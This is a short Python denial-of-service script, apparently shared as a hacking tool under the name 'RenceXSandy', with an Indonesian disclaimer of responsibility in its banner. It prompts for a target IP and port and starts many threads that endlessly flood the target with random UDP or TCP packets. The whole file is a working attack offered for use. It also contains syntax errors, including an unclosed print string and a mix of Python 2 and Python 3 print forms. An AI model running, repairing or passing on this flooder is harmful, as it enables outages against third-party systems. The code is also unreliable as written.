#!/usr/bin/env python3
#Code by RenceXSandy
import random
import socket
import threading

print("~~~ DDOS TOOLS By RenceXSandy~~~")
print("~~~ Code and Scripted by Rence Reedit by Sandy
print "|=====================================|"
print "|       WELCOME TO MY TOOLS           |"
print "|                                     |"
print "| Author        : RenceXSandy        |"
print "| YOUTUBE       : Rence Official        |"
print "| apa pun yang terjadi tidak di       |"               
print "| tanggung oleh Author                |"
print "|                                     |"
print "|=====================================|"
ip = str(input(" Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Paket yang dikirim ke target:"))
threads = int(input(" Threads yang dikirim:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()